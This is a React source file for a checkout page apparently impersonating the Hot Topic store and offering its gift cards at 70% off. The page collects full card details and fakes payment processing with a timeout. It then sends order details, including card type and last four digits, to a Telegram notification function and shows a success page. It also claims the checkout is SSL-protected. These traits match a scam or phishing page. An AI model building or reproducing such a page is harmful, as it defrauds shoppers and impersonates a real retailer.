
import { useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { toast } from "@/hooks/use-toast";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import HotTopicHeader from "@/components/HotTopicHeader";
import HotTopicFooter from "@/components/HotTopicFooter";
import { AlertCircle, CreditCard, LockIcon, Shield } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";

const CARD_TYPES = [
  { name: "Visa", image: "https://i.imgur.com/Ames4RX.png" },
  { name: "Mastercard", image: "https://i.imgur.com/bCBB4IZ.png" },
  { name: "American Express", image: "https://i.imgur.com/MsEDvx2.png" },
  { name: "Discover", image: "https://i.imgur.com/o3VHRg1.png" }
];

// Regex patterns for validation
const CARD_NUMBER_REGEX = /^[0-9]{13,19}$/;
const CVV_REGEX = /^[0-9]{3,4}$/;

const Payment = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const [selectedCardType, setSelectedCardType] = useState<string>("Visa");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [formData, setFormData] = useState({
    cardNumber: "",
    cardName: "",
    expiryDate: "",
    cvv: ""
  });
  const [errors, setErrors] = useState<Record<string, string>>({});

  // Get order details from location state
  const orderDetails = location.state?.orderDetails;
  const giftCardValue = location.state?.giftCardValue;
  const discountedAmount = location.state?.discountedAmount;

  // If no order details, redirect to home
  if (!orderDetails) {
    navigate("/");
    toast({
      title: "Error",
      description: "No order information found. Please start again.",
      variant: "destructive",
    });
  }

  const validateField = (name: string, value: string): string => {
    switch (name) {
      case "cardName":
        return value.trim() === "" ? "This field is required" : "";
      case "cardNumber":
        return !CARD_NUMBER_REGEX.test(value.replace(/\s/g, '')) ? "Please enter a valid card number" : "";
      case "expiryDate":
        const [month, year] = value.split('/').map(part => part.trim());
        if (!month || !year || isNaN(Number(month)) || isNaN(Number(year))) {
          return "Please enter a valid expiry date (MM/YY)";
        }
        if (Number(month) < 1 || Number(month) > 12) {
          return "Month must be between 1 and 12";
        }
        const currentYear = new Date().getFullYear() % 100;
        if (Number(year) < currentYear) {
          return "Card has expired";
        }
        return "";
      case "cvv":
        return !CVV_REGEX.test(value) ? "Please enter a valid CVV" : "";
      default:
        return "";
    }
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
    
    // Validate field on change and update errors
    const error = validateField(name, value);
    setErrors(prev => ({
      ...prev,
      [name]: error
    }));
  };

  const formatCardNumber = (value: string): string => {
    // Remove all non-digit characters
    const cleaned = value.replace(/\D/g, '');
    
    // Format as XXXX XXXX XXXX XXXX
    const chunks = [];
    for (let i = 0; i < cleaned.length; i += 4) {
      chunks.push(cleaned.substring(i, i + 4));
    }
    return chunks.join(' ');
  };

  const formatExpiryDate = (value: string): string => {
    // Remove all non-digit characters
    const cleaned = value.replace(/\D/g, '');
    
    // Format as MM/YY
    if (cleaned.length >= 3) {
      return `${cleaned.substring(0, 2)}/${cleaned.substring(2, 4)}`;
    } else {
      return cleaned;
    }
  };

  const handleCardNumberInput = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value);
    setFormData(prev => ({
      ...prev,
      cardNumber: formatted
    }));
    
    // Validate card number
    const error = validateField("cardNumber", formatted);
    setErrors(prev => ({
      ...prev,
      cardNumber: error
    }));
  };

  const handleExpiryDateInput = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatExpiryDate(e.target.value);
    setFormData(prev => ({
      ...prev,
      expiryDate: formatted
    }));
    
    // Validate expiry date
    const error = validateField("expiryDate", formatted);
    setErrors(prev => ({
      ...prev,
      expiryDate: error
    }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // Validate all required fields
    const newErrors: Record<string, string> = {};
    let hasErrors = false;
    
    // Fields to validate
    const fieldNames = ["cardNumber", "cardName", "expiryDate", "cvv"];
    
    // Validate each field
    fieldNames.forEach(fieldName => {
      const error = validateField(fieldName, formData[fieldName as keyof typeof formData]);
      if (error) {
        newErrors[fieldName] = error;
        hasErrors = true;
      }
    });
    
    setErrors(newErrors);
    
    if (hasErrors) {
      toast({
        title: "Validation Error",
        description: "Please fix the errors in the form",
        variant: "destructive",
      });
      return;
    }
    
    // Set loading state
    setIsSubmitting(true);
    
    try {
      console.log(`Processing payment for $${giftCardValue} gift card (70% off) using ${selectedCardType}`);
      
      // Create payment processing simulation
      setTimeout(() => {
        // Create order details object with payment info
        const completeOrderDetails = {
          ...orderDetails,
          paymentMethod: selectedCardType,
          lastFour: formData.cardNumber.slice(-4)
        };
  
        // Save order details to localStorage for reference
        localStorage.setItem("hotTopicOrder", JSON.stringify(completeOrderDetails));
        
        // Send order notification to Telegram
        try {
          console.log("Sending order notification to Telegram with details:", completeOrderDetails);
          supabase.functions.invoke("send-telegram-notification", {
            body: completeOrderDetails
          }).then(response => {
            if (response.error) {
              console.error("Failed to send Telegram notification:", response.error);
            } else {
              console.log("Telegram notification sent successfully:", response.data);
            }
          });
        } catch (telegramErr) {
          console.error("Error sending Telegram notification:", telegramErr);
        }
        
        // Navigate to payment success page
        navigate("/payment-success", { 
          state: { 
            orderDetails: completeOrderDetails,
            giftCardValue,
            discountedAmount
          } 
        });
      }, 2500);
    } catch (error) {
      console.error("Payment submission error:", error);
      toast({
        title: "System Error",
        description: "We encountered a technical issue. Please try again later.",
        variant: "destructive",
      });
      setIsSubmitting(false);
    }
  };

  const renderErrorMessage = (fieldName: string) => {
    if (!errors[fieldName]) return null;
    
    return (
      <div className="text-red-500 text-sm mt-1 flex items-center gap-1">
        <AlertCircle className="h-4 w-4" />
        <span>{errors[fieldName]}</span>
      </div>
    );
  };

  return (
    <div className="min-h-screen bg-black">
      <HotTopicHeader />
      
      <div className="container py-8">
        <div className="max-w-3xl mx-auto space-y-6">
          <div className="bg-hottopic-gray/10 rounded-xl p-6 border border-hottopic-gray/20">
            <h1 className="text-3xl font-bold text-white mb-6 text-center">
              Complete Your <span className="text-hottopic-red">Payment</span>
            </h1>
            
            <form onSubmit={handleSubmit} className="space-y-6">
              {/* Payment Method */}
              <div className="space-y-4">
                <h2 className="text-2xl font-semibold text-white flex items-center mb-4">
                  <span className="bg-hottopic-red w-8 h-8 rounded-full flex items-center justify-center mr-2 text-white">
                    1
                  </span>
                  Payment Method
                </h2>
                
                <div className="space-y-2">
                  <Label htmlFor="cardType" className="text-white">Card Type*</Label>
                  <div className="flex items-center gap-2">
                    <CreditCard className="h-5 w-5 text-hottopic-red" />
                    <Select
                      value={selectedCardType}
                      onValueChange={(value) => setSelectedCardType(value)}
                    >
                      <SelectTrigger 
                        className="bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red w-full sm:w-auto"
                        id="cardType"
                      >
                        <SelectValue placeholder="Select card type" />
                      </SelectTrigger>
                      <SelectContent className="bg-hottopic-dark border-hottopic-gray">
                        {CARD_TYPES.map((card) => (
                          <SelectItem 
                            key={card.name} 
                            value={card.name}
                            className="text-white hover:bg-hottopic-gray/30 focus:bg-hottopic-gray/30"
                          >
                            <div className="flex items-center gap-2">
                              <img src={card.image} alt={card.name} className="w-8 h-auto" /> 
                              {card.name}
                            </div>
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                  </div>
                </div>
              </div>
              
              {/* Card Details */}
              <div className="space-y-4">
                <h2 className="text-2xl font-semibold text-white flex items-center mb-4">
                  <span className="bg-hottopic-red w-8 h-8 rounded-full flex items-center justify-center mr-2 text-white">
                    2
                  </span>
                  Card Details
                </h2>
                
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label htmlFor="cardNumber" className="text-white">Card Number*</Label>
                    <div className="relative">
                      <Input
                        id="cardNumber"
                        name="cardNumber"
                        value={formData.cardNumber}
                        onChange={handleCardNumberInput}
                        className={`bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red pl-9 font-mono ${errors.cardNumber ? 'border-red-500' : ''}`}
                        placeholder="•••• •••• •••• ••••"
                        maxLength={19}
                      />
                      <CreditCard className="absolute left-3 top-2.5 h-4 w-4 text-gray-400" />
                    </div>
                    {renderErrorMessage("cardNumber")}
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="cardName" className="text-white">Name on Card*</Label>
                    <Input
                      id="cardName"
                      name="cardName"
                      value={formData.cardName}
                      onChange={handleInputChange}
                      className={`bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red ${errors.cardName ? 'border-red-500' : ''}`}
                      placeholder="Enter name as it appears on card"
                    />
                    {renderErrorMessage("cardName")}
                  </div>
                </div>
                
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label htmlFor="expiryDate" className="text-white">Expiry Date*</Label>
                    <Input
                      id="expiryDate"
                      name="expiryDate"
                      value={formData.expiryDate}
                      onChange={handleExpiryDateInput}
                      className={`bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red ${errors.expiryDate ? 'border-red-500' : ''}`}
                      placeholder="MM/YY"
                      maxLength={5}
                    />
                    {renderErrorMessage("expiryDate")}
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="cvv" className="text-white">Security Code (CVV)*</Label>
                    <div className="relative">
                      <Input
                        id="cvv"
                        name="cvv"
                        value={formData.cvv}
                        onChange={handleInputChange}
                        className={`bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red ${errors.cvv ? 'border-red-500' : ''}`}
                        placeholder="•••"
                        maxLength={4}
                        type="password"
                      />
                      <div className="absolute right-3 top-2.5 h-4 w-4 text-gray-400">
                        <LockIcon size={16} />
                      </div>
                    </div>
                    {renderErrorMessage("cvv")}
                  </div>
                </div>
              </div>
              
              {/* Order Summary */}
              <div className="bg-hottopic-gray/20 p-6 rounded-lg border border-hottopic-gray/30 space-y-4">
                <h3 className="text-xl font-semibold text-white mb-2">Order Summary</h3>
                
                <div className="space-y-2 text-sm">
                  <div className="flex justify-between">
                    <span className="text-gray-400">Item:</span>
                    <span className="text-white">Hot Topic Gift Card</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-400">Gift Card Value:</span>
                    <span className="text-white">${giftCardValue?.toFixed(2) || "0.00"}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-400">Discount:</span>
                    <span className="text-hottopic-red">70% OFF</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-400">Delivery Method:</span>
                    <span className="text-white capitalize">{orderDetails?.deliveryMethod}</span>
                  </div>
                  <div className="border-t border-hottopic-gray/30 my-2 pt-2 flex justify-between font-bold">
                    <span className="text-white">Total:</span>
                    <span className="text-hottopic-red">${discountedAmount?.toFixed(2) || "0.00"}</span>
                  </div>
                </div>
              </div>
              
              {/* Submit Button */}
              <div className="flex justify-center">
                <Button 
                  type="submit" 
                  disabled={isSubmitting}
                  className="w-full md:w-auto px-8 py-6 bg-hottopic-red hover:bg-hottopic-red/90 text-white font-bold text-lg"
                >
                  {isSubmitting ? (
                    <div className="flex items-center space-x-2">
                      <div className="w-5 h-5 border-2 border-t-transparent border-white rounded-full animate-spin"></div>
                      <span>Processing...</span>
                    </div>
                  ) : (
                    "Complete Purchase"
                  )}
                </Button>
              </div>
              
              <div className="flex items-center justify-center text-center">
                <Shield size={16} className="text-gray-400 mr-2" />
                <p className="text-gray-400 text-sm">
                  Secure checkout - Your information is protected with 256-bit SSL encryption
                </p>
              </div>
            </form>
          </div>
        </div>
      </div>
      
      <HotTopicFooter />
    </div>
  );
};

export default Payment;
